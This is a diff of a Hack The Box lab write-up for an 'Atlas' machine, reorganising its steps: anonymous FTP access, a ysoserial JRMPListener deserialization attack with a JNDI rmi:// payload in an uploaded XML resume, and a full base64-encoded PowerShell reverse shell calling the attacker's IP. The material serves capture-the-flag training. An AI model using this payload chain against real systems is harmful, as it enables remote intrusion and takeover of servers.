@@ -10,7 +10,8 @@ tags:
   - java-xml-marshallers
   - windows
   - hard
-lastmod: 2026-02-28T07:52:08.392Z
+  - 
+lastmod: 2026-03-07T18:30:13.231Z
 ---
 # Box Info
 
@@ -22,7 +23,7 @@ lastmod: 2026-02-28T07:52:08.392Z
 
 ### PORT & IP SCAN
 
-The `nmap` reveal that the machine is that allows the ftp anonymous login ,and show the ,atlas-pilot-1.0.0-SNAPSHOT.jar , atlas\_generator.zip , and the 3389 show the DNS with ATLAS, and the 8080 is running the tomcat .  with the windows a stand-alone machine.
+The `nmap` reveal that the machine allows the ftp anonymous login and the 3389 show the DNS with ATLAS, and the 8080 is running the tomcat .  So that is  the windows a stand-alone machine.
 
 ```shell
 ──(root㉿kali)-[~/Desktop/HTB/Altas]
@@ -70,9 +71,8 @@ Nmap done: 1 IP address (1 host up) scanned in 15.78 seconds
 
 The `nmap` scan reveals that Anonymous FTP login is enabled. Logging in with `anonymous:anonymous` grants access to two highly interesting files, which we immediately download for offline analysis:
 
-* `atlas-pilot-1.0.0-SNAPSHOT.jar`
-
-* `atlas_generator.zip`
+* `atlas-pilot-1.0.0-SNAPSHOT.jar`  is the compiled binary actually running on the server—together
+* `atlas_generator.zip`  is the raw source code blueprint of the target web app
 
 ```
 anonymous : anonymous
@@ -159,7 +159,6 @@ Archive:  atlas_generator.zip
 └─# ls
 atlas_generator.zip             build.gradle  gradlew      mvnw      openPort.txt  serviceScan.txt  spring-boot.txt
 atlas-pilot-1.0.0-SNAPSHOT.jar  gradle        gradlew.bat  mvnw.cmd  pom.xml       settings.gradle  src
-
 ```
 
 ### Web Recon 80
@@ -205,7 +204,7 @@ poc github : https://github.com/mbechler/marshalsec
 
 # Shell as john
 
-### Setting up ysoserial
+![Pasted image 20260308022716.png](/ob/Pasted%20image%2020260308022716.png)
 
 {{< toggle "Tag 🏷️" >}}
 
@@ -215,11 +214,15 @@ poc github : https://github.com/mbechler/marshalsec
 
 ![Pasted image 20260214135507.png](/ob/Pasted%20image%2020260214135507.png)
 
-java marshallers deserialization
-
 To exploit this, we need to stand up a malicious RMI registry and deliver a payload that executes commands on the target.
 
 To avoid cluttering the local host's Java environment, `ysoserial` is run via a Docker container. We bind port `1099` (the default RMI port) to the container.
+
+### Step 1 Set up ysoserial
+
+```
+vim dockerfile
+```
 
 ```
 FROM maven:3.9.9-eclipse-temurin-8
@@ -233,17 +236,15 @@ RUN mvn -q -DskipTests package
 ENTRYPOINT ["bash"]
 ```
 
+### Step 2 run ysoserial and openthe rmi port (1099)
+
 ```
-# Start the ysoserial Docker container
 sudo docker run -it --rm -p 1099:1099 ysoserial-java8
 
-# Start the JRMPListener hosting the CommonsBeanutils1 payload
 java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'ping 10.10.14.11'
 ```
 
-```
-sudo docker run -it --rm  -p 1099:1099 ysoserial-java8
-```
+### Step 3 POC by tcpdump
 
 *Note: We initially use a `ping` command and monitor with `sudo tcpdump -i tun0 icmp` to confirm code execution.*
 
@@ -253,7 +254,7 @@ sudo tcpdump -i tun0 icmp
 
 ***
 
-### Crafting the Malicious XML
+### Step 4 Crafting the Malicious XML
 
 upload the xml to web , and remark rmi://10.10.14.11/a , `rmi` already is the  port 1099 , so we dont need special say to rmi://10.10.14.11:1099/a , and open the burpsuite to easily send to repester to send again
 
@@ -267,11 +268,17 @@ We modify a valid XML resume template to include our JNDI injection payload. We 
 
 ![Pasted image 20260223140237.png](/ob/Pasted%20image%2020260223140237.png)
 
+Interception the Request in burpsuite for you to easily modify in the next time.
+
 ![Pasted image 20260223140212.png](/ob/Pasted%20image%2020260223140212.png)
+
+After you upload the file , you can start the docker which will send the POC of ping to kali
 
 ![Pasted image 20260223140757.png](/ob/Pasted%20image%2020260223140757.png)
 
-### RCE
+![Pasted image 20260308022744.png](/ob/Pasted%20image%2020260308022744.png)
+
+### Step 5 RCE
 
 After confirming execution via ICMP, we swap the `ping` command in our `ysoserial` listener for a Base64-encoded PowerShell reverse shell. Using Base64 prevents any bad character or parsing issues during execution.
 
@@ -281,7 +288,8 @@ After confirming execution via ICMP, we swap the `ping` command in our `ysoseria
 root@aaa47bf7ca7c:/opt/ysoserial# java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAxACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
 ```
 
-Catching the connection on our Netcat listener, we successfully gain a reverse shell as the user `john`.\
+Catching the connection on our Netcat listener, we successfully gain a reverse shell as the user `john`.
+
 ![Pasted image 20260223141248.png](/ob/Pasted%20image%2020260223141248.png)
 
 ### Setting Up Persistent Access
